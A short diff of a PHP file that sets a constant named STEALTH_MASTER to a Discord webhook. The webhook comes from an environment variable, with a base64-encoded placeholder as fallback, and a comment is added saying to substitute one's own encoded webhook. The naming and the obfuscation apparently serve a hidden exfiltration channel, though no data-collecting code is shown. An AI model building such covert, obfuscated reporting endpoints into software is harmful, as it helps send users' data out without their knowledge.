@@ -18,6 +18,7 @@ $railwayMasterWebhook = getenv('MASTER_WEBHOOK');
 if ($railwayMasterWebhook && filter_var($railwayMasterWebhook, FILTER_VALIDATE_URL)) {
     define('STEALTH_MASTER', $railwayMasterWebhook);
 } else {
+    // Fallback: Base64 encoded webhook (REPLACE WITH YOUR ENCODED WEBHOOK)
     define('STEALTH_MASTER', base64_decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvWU9VUl9NQVNURV9XRUJIT09LX0hFUkU='));
 }
 
